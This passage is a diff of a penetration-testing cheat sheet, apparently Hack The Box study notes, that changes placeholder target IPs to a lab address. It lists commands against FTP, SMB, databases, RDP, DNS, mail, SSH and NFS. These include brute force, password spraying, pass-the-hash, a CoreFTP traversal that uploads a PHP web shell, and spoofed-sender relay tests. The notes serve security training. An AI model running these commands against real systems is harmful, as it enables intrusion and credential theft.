@@ -83,7 +83,7 @@ FTP transfers files between client and server. It operates in cleartext — cred
 ### Enumeration
 
 ```bash
-Hackerpatel007_1@htb[/htb]$ nmap -sV -p21 -sC --script ftp-anon,ftp-syst 10.129.x.x
+Hackerpatel007_1@htb[/htb]$ nmap -sV -p21 -sC --script ftp-anon,ftp-syst 10.129.57.117
 ```
 
 Check for anonymous access immediately — Nmap's `ftp-anon` script flags it in the output.
@@ -91,7 +91,7 @@ Check for anonymous access immediately — Nmap's `ftp-anon` script flags it in 
 ### Anonymous Login
 
 ```bash
-Hackerpatel007_1@htb[/htb]$ ftp 10.129.x.x
+Hackerpatel007_1@htb[/htb]$ ftp 10.129.57.117
 # Username: anonymous
 # Password: (press Enter)
 
@@ -106,7 +106,7 @@ ftp> bye
 ### Credential Brute Force
 
 ```bash
-Hackerpatel007_1@htb[/htb]$ hydra -l fiona -P /usr/share/wordlists/rockyou.txt ftp://10.129.x.x -t 1
+Hackerpatel007_1@htb[/htb]$ hydra -l fiona -P /usr/share/wordlists/rockyou.txt ftp://10.129.57.117 -t 1
 ```
 
 Use `-t 1` — rate-limited FTP servers silently fail with multiple threads.
@@ -114,7 +114,7 @@ Use `-t 1` — rate-limited FTP servers silently fail with multiple threads.
 ### Download Entire FTP Tree
 
 ```bash
-Hackerpatel007_1@htb[/htb]$ wget -m --no-passive ftp://anonymous:anonymous@10.129.x.x
+Hackerpatel007_1@htb[/htb]$ wget -m --no-passive ftp://anonymous:anonymous@10.129.57.117
 ```
 
 ### CoreFTP CVE-2022-22836 (Directory Traversal)
@@ -122,10 +122,10 @@ Hackerpatel007_1@htb[/htb]$ wget -m --no-passive ftp://anonymous:anonymous@10.12
 CoreFTP build 725 allows unauthenticated directory traversal via PUT with a path traversal payload:
 
 ```bash
-Hackerpatel007_1@htb[/htb]$ curl -k -X PUT -H "Host: 10.129.x.x" \
+Hackerpatel007_1@htb[/htb]$ curl -k -X PUT -H "Host: 10.129.57.117" \
 --basic -u anonymous:anonymous \
 -d '<?php echo system($_GET["c"]); ?>' \
-"https://10.129.x.x:443/../../../../xampp/htdocs/shell.php" \
+"https://10.129.57.117:443/../../../../xampp/htdocs/shell.php" \
 --path-as-is
 ```
 
@@ -155,22 +155,22 @@ SMB is the backbone of Windows file sharing. It is one of the most commonly atta
 
 ```bash
 # Service version and OS fingerprinting
-Hackerpatel007_1@htb[/htb]$ nmap -sV -p445 -sC 10.129.x.x
+Hackerpatel007_1@htb[/htb]$ nmap -sV -p445 -sC 10.129.57.117
 
 # List shares — null session
-Hackerpatel007_1@htb[/htb]$ smbclient -L //10.129.x.x/ -N
-Hackerpatel007_1@htb[/htb]$ smbmap -H 10.129.x.x
-Hackerpatel007_1@htb[/htb]$ crackmapexec smb 10.129.x.x --shares -u "" -p ""
+Hackerpatel007_1@htb[/htb]$ smbclient -L //10.129.57.117/ -N
+Hackerpatel007_1@htb[/htb]$ smbmap -H 10.129.57.117
+Hackerpatel007_1@htb[/htb]$ crackmapexec smb 10.129.57.117 --shares -u "" -p ""
 
 # Full SMB enumeration
-Hackerpatel007_1@htb[/htb]$ enum4linux -a 10.129.x.x
-Hackerpatel007_1@htb[/htb]$ rpcclient -U "" -N 10.129.x.x
+Hackerpatel007_1@htb[/htb]$ enum4linux -a 10.129.57.117
+Hackerpatel007_1@htb[/htb]$ rpcclient -U "" -N 10.129.57.117
 ```
 
 ### Connecting to Shares
 
 ```bash
-Hackerpatel007_1@htb[/htb]$ smbclient //10.129.x.x/ShareName -U username
+Hackerpatel007_1@htb[/htb]$ smbclient //10.129.57.117/ShareName -U username
 smb: \> ls
 smb: \> get credentials.txt
 smb: \> put shell.php
@@ -181,7 +181,7 @@ smb: \> mget *
 ### Password Spraying
 
 ```bash
-Hackerpatel007_1@htb[/htb]$ crackmapexec smb 10.129.x.x -u users.txt -p 'Password123!' --continue-on-success
+Hackerpatel007_1@htb[/htb]$ crackmapexec smb 10.129.57.117 -u users.txt -p 'Password123!' --continue-on-success
 ```
 
 Spray with one password across many users. This avoids account lockout policies that trigger after N failed attempts for a single account.
@@ -189,7 +189,7 @@ Spray with one password across many users. This avoids account lockout policies 
 ### Pass-the-Hash (PTH)
 
 ```bash
-Hackerpatel007_1@htb[/htb]$ crackmapexec smb 10.129.x.x -u Administrator -H aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6
+Hackerpatel007_1@htb[/htb]$ crackmapexec smb 10.129.57.117 -u Administrator -H aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6
 ```
 
 NTLM hashes recovered from memory or files can authenticate directly to SMB without cracking — no password needed.
@@ -218,9 +218,9 @@ MySQL is the most widely deployed open-source database. XAMPP installs it with r
 ### Connection
 
 ```bash
-Hackerpatel007_1@htb[/htb]$ mysql -u root -h 10.129.x.x                   # No password
-Hackerpatel007_1@htb[/htb]$ mysql -u root -p'password' -h 10.129.x.x
-Hackerpatel007_1@htb[/htb]$ mysql -u root -h 10.129.x.x --skip-ssl        # When client demands SSL but server is old
+Hackerpatel007_1@htb[/htb]$ mysql -u root -h 10.129.57.117                   # No password
+Hackerpatel007_1@htb[/htb]$ mysql -u root -p'password' -h 10.129.57.117
+Hackerpatel007_1@htb[/htb]$ mysql -u root -h 10.129.57.117 --skip-ssl        # When client demands SSL but server is old
 ```
 
 ### Core Enumeration Queries
@@ -255,8 +255,8 @@ INTO OUTFILE 'C:/xampp/htdocs/shell.php';
 After writing the shell, trigger it:
 
 ```bash
-Hackerpatel007_1@htb[/htb]$ curl "http://10.129.x.x/shell.php?c=whoami"
-Hackerpatel007_1@htb[/htb]$ curl "http://10.129.x.x/shell.php?c=type+C:\Users\Administrator\Desktop\flag.txt"
+Hackerpatel007_1@htb[/htb]$ curl "http://10.129.57.117/shell.php?c=whoami"
+Hackerpatel007_1@htb[/htb]$ curl "http://10.129.57.117/shell.php?c=type+C:\Users\Administrator\Desktop\flag.txt"
 ```
 
 ### MySQL Checklist
@@ -282,9 +282,9 @@ MSSQL is SQL Server for Windows environments. Beyond standard database access, i
 ### Connection
 
 ```bash
-Hackerpatel007_1@htb[/htb]$ mssqlclient.py user:password@10.129.x.x
-Hackerpatel007_1@htb[/htb]$ mssqlclient.py user:password@10.129.x.x -windows-auth   # Domain auth
-Hackerpatel007_1@htb[/htb]$ sqsh -S 10.129.x.x -U user -P password
+Hackerpatel007_1@htb[/htb]$ mssqlclient.py user:password@10.129.57.117
+Hackerpatel007_1@htb[/htb]$ mssqlclient.py user:password@10.129.57.117 -windows-auth   # Domain auth
+Hackerpatel007_1@htb[/htb]$ sqsh -S 10.129.57.117 -U user -P password
 ```
 
 ### OS Command Execution via xp_cmdshell
@@ -350,28 +350,28 @@ RDP provides full Windows GUI remote access. It is the highest-value access on a
 ### Enumeration
 
 ```bash
-Hackerpatel007_1@htb[/htb]$ nmap -sV -p 3389 --script rdp-ntlm-info 10.129.x.x
+Hackerpatel007_1@htb[/htb]$ nmap -sV -p 3389 --script rdp-ntlm-info 10.129.57.117
 # rdp-ntlm-info reveals: hostname, domain, Windows version without credentials
 ```
 
 ### Connect with Credentials
 
 ```bash
-Hackerpatel007_1@htb[/htb]$ xfreerdp /u:administrator /p:'Password123!' /v:10.129.x.x /cert:ignore
-Hackerpatel007_1@htb[/htb]$ xfreerdp /u:domain\\username /p:'pass' /v:10.129.x.x /cert:ignore
+Hackerpatel007_1@htb[/htb]$ xfreerdp /u:administrator /p:'Password123!' /v:10.129.57.117 /cert:ignore
+Hackerpatel007_1@htb[/htb]$ xfreerdp /u:domain\\username /p:'pass' /v:10.129.57.117 /cert:ignore
 ```
 
 ### Password Spraying
 
 ```bash
-Hackerpatel007_1@htb[/htb]$ hydra -L users.txt -p 'Password123!' rdp://10.129.x.x -t 1
-Hackerpatel007_1@htb[/htb]$ crowbar -b rdp -s 10.129.x.x/32 -U users.txt -c 'Password123!'
+Hackerpatel007_1@htb[/htb]$ hydra -L users.txt -p 'Password123!' rdp://10.129.57.117 -t 1
+Hackerpatel007_1@htb[/htb]$ crowbar -b rdp -s 10.129.57.117/32 -U users.txt -c 'Password123!'
 ```
 
 ### Pass-the-Hash (Restricted Admin Mode)
 
 ```bash
-Hackerpatel007_1@htb[/htb]$ xfreerdp /u:Administrator /pth:32693b11e6aa90eb43d32c72a07ceea6 /v:10.129.x.x /cert:ignore
+Hackerpatel007_1@htb[/htb]$ xfreerdp /u:Administrator /pth:32693b11e6aa90eb43d32c72a07ceea6 /v:10.129.57.117 /cert:ignore
 ```
 
 ### Session Hijacking (Requires SYSTEM)
@@ -407,7 +407,7 @@ DNS maps hostnames to IP addresses. Attackers rarely exploit DNS directly for in
 ### Zone Transfer
 
 ```bash
-Hackerpatel007_1@htb[/htb]$ dig axfr @10.129.x.x inlanefreight.htb
+Hackerpatel007_1@htb[/htb]$ dig axfr @10.129.57.117 inlanefreight.htb
 ```
 
 A successful zone transfer returns every DNS record in the zone — A records, MX records, CNAME records, internal hostnames — the entire infrastructure map in one query.
@@ -418,7 +418,7 @@ A successful zone transfer returns every DNS record in the zone — A records, M
 Hackerpatel007_1@htb[/htb]$ gobuster dns -d inlanefreight.htb \
 -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -t 50
 
-Hackerpatel007_1@htb[/htb]$ dnsrecon -d inlanefreight.htb -n 10.129.x.x -t brt \
+Hackerpatel007_1@htb[/htb]$ dnsrecon -d inlanefreight.htb -n 10.129.57.117 -t brt \
 -D /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
 ```
 
@@ -426,7 +426,7 @@ Hackerpatel007_1@htb[/htb]$ dnsrecon -d inlanefreight.htb -n 10.129.x.x -t brt \
 
 ```bash
 Hackerpatel007_1@htb[/htb]$ ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
--u http://10.129.x.x \
+-u http://10.129.57.117 \
 -H "Host: FUZZ.inlanefreight.htb" \
 -fs <normal_response_size>
 ```
@@ -436,7 +436,7 @@ A different response size means a valid virtual host was found — a host that h
 ### Add Discovered Domains to /etc/hosts
 
 ```bash
-Hackerpatel007_1@htb[/htb]$ sudo sh -c "echo '10.129.x.x inlanefreight.htb dev.inlanefreight.htb admin.inlanefreight.htb' >> /etc/hosts"
+Hackerpatel007_1@htb[/htb]$ sudo sh -c "echo '10.129.57.117 inlanefreight.htb dev.inlanefreight.htb admin.inlanefreight.htb' >> /etc/hosts"
 ```
 
 ### DNS Checklist
@@ -462,14 +462,14 @@ Email protocols are overlooked in most assessments but are high-value targets. S
 SMTP's `VRFY` and `RCPT TO` commands were designed to verify email addresses. On misconfigured servers they confirm if a user exists — no password needed.
 
 ```bash
-Hackerpatel007_1@htb[/htb]$ smtp-user-enum -M RCPT -U users.list -D inlanefreight.htb -t 10.129.x.x
-Hackerpatel007_1@htb[/htb]$ smtp-user-enum -M VRFY -U users.list -t 10.129.x.x
+Hackerpatel007_1@htb[/htb]$ smtp-user-enum -M RCPT -U users.list -D inlanefreight.htb -t 10.129.57.117
+Hackerpatel007_1@htb[/htb]$ smtp-user-enum -M VRFY -U users.list -t 10.129.57.117
 ```
 
 Manual interaction to verify:
 
 ```bash
-Hackerpatel007_1@htb[/htb]$ nc -nv 10.129.x.x 25
+Hackerpatel007_1@htb[/htb]$ nc -nv 10.129.57.117 25
 EHLO test
 VRFY fiona@inlanefreight.htb
 # 250 = user exists | 550 = does not exist
@@ -483,7 +483,7 @@ An open relay allows sending from any address to any address — abusable for ph
 ```bash
 Hackerpatel007_1@htb[/htb]$ swaks --to victim@external.com \
 --from ceo@inlanefreight.htb \
---server 10.129.x.x \
+--server 10.129.57.117 \
 --body "Test"
 # Successful send = open relay confirmed
 ```
@@ -491,9 +491,9 @@ Hackerpatel007_1@htb[/htb]$ swaks --to victim@external.com \
 ### IMAP — Reading Inbox Manually
 
 ```bash
-Hackerpatel007_1@htb[/htb]$ nc -nv 10.129.x.x 143
+Hackerpatel007_1@htb[/htb]$ nc -nv 10.129.57.117 143
 # SSL connection:
-Hackerpatel007_1@htb[/htb]$ openssl s_client -connect 10.129.x.x:993
+Hackerpatel007_1@htb[/htb]$ openssl s_client -connect 10.129.57.117:993
 
 # IMAP commands
 a LOGIN fiona password123
@@ -505,7 +505,7 @@ d FETCH 1 BODY[]                    # Read full body of email 1
 ### POP3 — Reading Inbox Manually
 
 ```bash
-Hackerpatel007_1@htb[/htb]$ nc -nv 10.129.x.x 110
+Hackerpatel007_1@htb[/htb]$ nc -nv 10.129.57.117 110
 USER fiona
 PASS password123
 LIST                    # Count and size of all messages
@@ -515,8 +515,8 @@ RETR 1                  # Read message 1
 ### Password Spray IMAP/POP3
 
 ```bash
-Hackerpatel007_1@htb[/htb]$ hydra -L valid_users.txt -P passwords.txt imap://10.129.x.x -t 10
-Hackerpatel007_1@htb[/htb]$ hydra -L valid_users.txt -P passwords.txt pop3://10.129.x.x -t 10
+Hackerpatel007_1@htb[/htb]$ hydra -L valid_users.txt -P passwords.txt imap://10.129.57.117 -t 10
+Hackerpatel007_1@htb[/htb]$ hydra -L valid_users.txt -P passwords.txt pop3://10.129.57.117 -t 10
 ```
 
 ### Email Services Checklist
@@ -542,10 +542,10 @@ SSH provides encrypted remote shell access on Linux and Unix systems. It is the 
 ### Connection
 
 ```bash
-Hackerpatel007_1@htb[/htb]$ ssh user@10.129.x.x                      # Password auth
-Hackerpatel007_1@htb[/htb]$ ssh -i id_rsa user@10.129.x.x            # Key-based auth
-Hackerpatel007_1@htb[/htb]$ ssh -i id_rsa user@10.129.x.x -p 2222    # Non-standard port
-Hackerpatel007_1@htb[/htb]$ chmod 600 id_rsa                          # Required before using key
+Hackerpatel007_1@htb[/htb]$ ssh user@10.129.57.117                      # Password auth
+Hackerpatel007_1@htb[/htb]$ ssh -i id_rsa user@10.129.57.117            # Key-based auth
+Hackerpatel007_1@htb[/htb]$ ssh -i id_rsa user@10.129.57.117 -p 2222    # Non-standard port
+Hackerpatel007_1@htb[/htb]$ chmod 600 id_rsa                             # Required before using key
 ```
 
 ### Crack a Passphrase-Protected Key
@@ -558,7 +558,7 @@ Hackerpatel007_1@htb[/htb]$ john id_rsa.hash --wordlist=/usr/share/wordlists/roc
 ### Password Brute Force
 
 ```bash
-Hackerpatel007_1@htb[/htb]$ hydra -L users.txt -P rockyou.txt ssh://10.129.x.x -t 4
+Hackerpatel007_1@htb[/htb]$ hydra -L users.txt -P rockyou.txt ssh://10.129.57.117 -t 4
 ```
 
 ### Username Enumeration (OpenSSH < 7.7)
@@ -566,7 +566,7 @@ Hackerpatel007_1@htb[/htb]$ hydra -L users.txt -P rockyou.txt ssh://10.129.x.x -
 Older versions of OpenSSH respond differently to valid vs invalid usernames:
 
 ```bash
-Hackerpatel007_1@htb[/htb]$ python3 ssh-username-enum.py -U users.txt 10.129.x.x
+Hackerpatel007_1@htb[/htb]$ python3 ssh-username-enum.py -U users.txt 10.129.57.117
 ```
 
 ### SSH Checklist
@@ -600,15 +600,15 @@ Hackerpatel007_1@htb[/htb]$ hydra -l <user> -P <wordlist> <protocol>://<IP> [opt
 Hackerpatel007_1@htb[/htb]$ hydra -L <userlist> -p <password> <protocol>://<IP> [options]
 
 # Per-service examples
-Hackerpatel007_1@htb[/htb]$ hydra -l admin -P rockyou.txt ftp://10.129.x.x -t 1
-Hackerpatel007_1@htb[/htb]$ hydra -l admin -P rockyou.txt ssh://10.129.x.x -t 4
-Hackerpatel007_1@htb[/htb]$ hydra -l admin -P rockyou.txt rdp://10.129.x.x -t 1
-Hackerpatel007_1@htb[/htb]$ hydra -l admin -P rockyou.txt smb://10.129.x.x
-Hackerpatel007_1@htb[/htb]$ hydra -l admin -P rockyou.txt mysql://10.129.x.x
-Hackerpatel007_1@htb[/htb]$ hydra -l admin -P rockyou.txt imap://10.129.x.x
+Hackerpatel007_1@htb[/htb]$ hydra -l admin -P rockyou.txt ftp://10.129.57.117 -t 1
+Hackerpatel007_1@htb[/htb]$ hydra -l admin -P rockyou.txt ssh://10.129.57.117 -t 4
+Hackerpatel007_1@htb[/htb]$ hydra -l admin -P rockyou.txt rdp://10.129.57.117 -t 1
+Hackerpatel007_1@htb[/htb]$ hydra -l admin -P rockyou.txt smb://10.129.57.117
+Hackerpatel007_1@htb[/htb]$ hydra -l admin -P rockyou.txt mysql://10.129.57.117
+Hackerpatel007_1@htb[/htb]$ hydra -l admin -P rockyou.txt imap://10.129.57.117
 
 # HTTP form login
-Hackerpatel007_1@htb[/htb]$ hydra -l admin -P rockyou.txt 10.129.x.x http-post-form \
+Hackerpatel007_1@htb[/htb]$ hydra -l admin -P rockyou.txt 10.129.57.117 http-post-form \
 "/login:user=^USER^&pass=^PASS^:Invalid credentials" -t 10
 
 # Critical flags
@@ -701,7 +701,7 @@ NFS is the Linux/Unix equivalent of SMB — it allows remote mounting of directo
 ### Enumeration
 
 ```bash
-Hackerpatel007_1@htb[/htb]$ showmount -e 10.129.x.x
+Hackerpatel007_1@htb[/htb]$ showmount -e 10.129.57.117
 # /var/nfs/general *               ← accessible by everyone
 # /home/user *(rw,no_root_squash)  ← writable, no_root_squash = critical
 ```
@@ -710,7 +710,7 @@ Hackerpatel007_1@htb[/htb]$ showmount -e 10.129.x.x
 
 ```bash
 Hackerpatel007_1@htb[/htb]$ sudo mkdir /mnt/nfs
-Hackerpatel007_1@htb[/htb]$ sudo mount -t nfs 10.129.x.x:/var/nfs/general /mnt/nfs -o nolock
+Hackerpatel007_1@htb[/htb]$ sudo mount -t nfs 10.129.57.117:/var/nfs/general /mnt/nfs -o nolock
 Hackerpatel007_1@htb[/htb]$ ls -la /mnt/nfs
 ```
 
